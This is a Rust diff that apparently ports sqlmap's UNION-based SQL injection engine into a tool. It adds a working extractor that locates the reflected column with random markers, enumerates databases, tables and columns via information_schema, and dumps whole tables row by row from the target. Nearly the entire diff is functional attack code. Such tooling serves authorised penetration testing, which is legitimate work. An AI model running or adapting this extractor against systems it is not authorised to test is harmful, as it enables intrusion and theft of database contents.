@@ -284,6 +284,222 @@ impl<'a> BlindExtractor<'a> {
     }
 }
 
+/// Extracts data through a confirmed UNION injection: one request per value
+/// (port of sqlmap `useUnionEngine`: the query result rides back inside the
+/// page, delimited by random markers).
+pub struct UnionExtractor<'a> {
+    client: &'a Client,
+    conf: &'a Config,
+    param: Param,
+    inj: Injection,
+    columns: u32,
+    seed: u64,
+    pub log: Vec<String>,
+}
+
+/// Random hex-delimited marker pair (sqlmap delimits the UNION echo the same
+/// way so the value can be located in the page).
+struct Markers {
+    open_sql: String,
+    close_sql: String,
+    open_txt: String,
+    close_txt: String,
+}
+
+fn markers(seed: u64) -> Markers {
+    let mut x = seed.max(1) ^ 0x9e3779b9;
+    let mut gen = || {
+        let mut s = String::new();
+        for _ in 0..5 {
+            x ^= x << 13;
+            x ^= x >> 7;
+            x ^= x << 17;
+            s.push((b'a' + (x % 26) as u8) as char);
+        }
+        s
+    };
+    let (a, b) = (gen(), gen());
+    Markers {
+        open_sql: hex(&a),
+        close_sql: hex(&b),
+        open_txt: a,
+        close_txt: b,
+    }
+}
+
+impl<'a> UnionExtractor<'a> {
+    pub fn new(client: &'a Client, conf: &'a Config, param: Param, inj: Injection) -> Option<Self> {
+        let columns = inj.column_count?;
+        Some(Self {
+            client,
+            conf,
+            param,
+            inj,
+            columns,
+            seed: 0,
+            log: Vec::new(),
+        })
+    }
+
+    /// Send `UNION ALL SELECT <items>` through the injection boundary and
+    /// return the raw response body.
+    fn send_items(&mut self, items: &[String]) -> Option<String> {
+        self.seed += 1;
+        let payload = format!(" UNION ALL SELECT {}", items.join(","));
+        let val = assemble(
+            self.conf,
+            &mut self.log,
+            &self.param,
+            &self.inj.boundary,
+            &payload,
+            30000 + self.seed,
+        );
+        let resp = self
+            .client
+            .request(&build_request(self.conf, &self.param, &val))
+            .ok()?;
+        Some(resp.body)
+    }
+
+    fn null_row(&self) -> Vec<String> {
+        vec!["NULL".to_string(); self.columns as usize]
+    }
+
+    /// Find which UNION column is reflected in the page (sqlmap `unionTest`'s
+    /// second half: probe each position with a delimited constant).
+    fn find_echo_position(&mut self) -> Option<usize> {
+        for pos in 0..self.columns as usize {
+            let m = markers(40000 + self.seed);
+            let mut items = self.null_row();
+            items[pos] = format!("CONCAT({},0x70726f6265,{})", m.open_sql, m.close_sql);
+            let body = self.send_items(&items)?;
+            if body.contains(&format!("{}probe{}", m.open_txt, m.close_txt)) {
+                return Some(pos);
+            }
+        }
+        None
+    }
+
+    /// Evaluate one scalar subquery and extract its value from the page echo.
+    fn query_scalar(&mut self, echo_pos: usize, scalar: &str) -> Option<String> {
+        let m = markers(50000 + self.seed);
+        let mut items = self.null_row();
+        items[echo_pos] = format!("CONCAT({},({scalar}),{})", m.open_sql, m.close_sql);
+        let body = self.send_items(&items)?;
+        let start = body.find(&m.open_txt)? + m.open_txt.len();
+        let end = body[start..].find(&m.close_txt)? + start;
+        Some(body[start..end].to_string())
+    }
+
+    /// Run the enumeration requested by the config flags, UNION channel.
+    pub fn run(&mut self) -> Enumeration {
+        let mut en = Enumeration::default();
+        let Some(echo) = self.find_echo_position() else {
+            self.log
+                .push("UNION exfil: no SELECT-list column is reflected in the page - giving up".into());
+            return en;
+        };
+        self.log.push(format!(
+            "UNION exfil: column {} of {} is reflected - using it",
+            echo + 1,
+            self.columns
+        ));
+
+        let mut dbs: Vec<String> = Vec::new();
+        let need_dbs = self.conf.enum_dbs || (self.conf.enum_tables && self.conf.target_db.is_none());
+        if need_dbs {
+            self.log.push("enumerating database names (UNION)".into());
+            if let Some(v) = self.query_scalar(
+                echo,
+                "SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3a) FROM information_schema.schemata",
+            ) {
+                dbs = v.split(':').filter(|s| !s.is_empty()).map(String::from).collect();
+                self.log.push(format!("  databases: {}", dbs.join(", ")));
+                if self.conf.enum_dbs {
+                    en.databases = dbs.clone();
+                }
+            }
+        }
+
+        if self.conf.enum_tables {
+            let targets: Vec<String> = match &self.conf.target_db {
+                Some(d) => vec![d.clone()],
+                None => dbs.clone(),
+            };
+            for db in targets {
+                if let Some(v) = self.query_scalar(
+                    echo,
+                    &format!(
+                        "SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a) FROM information_schema.tables WHERE table_schema={}",
+                        hex(&db)
+                    ),
+                ) {
+                    let tables: Vec<String> =
+                        v.split(':').filter(|s| !s.is_empty()).map(String::from).collect();
+                    self.log.push(format!("  {db}: {}", tables.join(", ")));
+                    en.tables.insert(db.clone(), tables);
+                }
+            }
+        }
+
+        if self.conf.enum_columns || self.conf.dump {
+            match (self.conf.target_db.clone(), self.conf.target_table.clone()) {
+                (Some(db), Some(table)) => {
+                    let cols = self
+                        .query_scalar(
+                            echo,
+                            &format!(
+                                "SELECT GROUP_CONCAT(column_name SEPARATOR 0x3a) FROM information_schema.columns WHERE table_schema={} AND table_name={}",
+                                hex(&db),
+                                hex(&table)
+                            ),
+                        )
+                        .map(|v| v.split(':').filter(|s| !s.is_empty()).map(String::from).collect::<Vec<_>>())
+                        .unwrap_or_default();
+                    self.log.push(format!("  {db}.{table}: {}", cols.join(", ")));
+                    if self.conf.enum_columns {
+                        en.columns.push(ColumnEntry {
+                            db: db.clone(),
+                            table: table.clone(),
+                            columns: cols.clone(),
+                        });
+                    }
+                    if self.conf.dump {
+                        let n = self
+                            .query_scalar(echo, &format!("SELECT COUNT(*) FROM {db}.{table}"))
+                            .and_then(|v| v.trim().parse::<u32>().ok())
+                            .unwrap_or(0);
+                        let mut rows = Vec::new();
+                        for i in 0..n {
+                            if let Some(v) = self.query_scalar(
+                                echo,
+                                &format!(
+                                    "SELECT CONCAT_WS(0x3a,{}) FROM {db}.{table} LIMIT {i},1",
+                                    cols.join(",")
+                                ),
+                            ) {
+                                rows.push(v.split(':').map(String::from).collect::<Vec<_>>());
+                            }
+                        }
+                        self.log.push(format!("  dumped {} row(s) from {db}.{table}", rows.len()));
+                        en.dumps.push(TableDump {
+                            db,
+                            table,
+                            columns: cols,
+                            rows,
+                        });
+                    }
+                }
+                _ => self
+                    .log
+                    .push("--columns/--dump require -D <db> and -T <table> - skipped".into()),
+            }
+        }
+
+        en
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
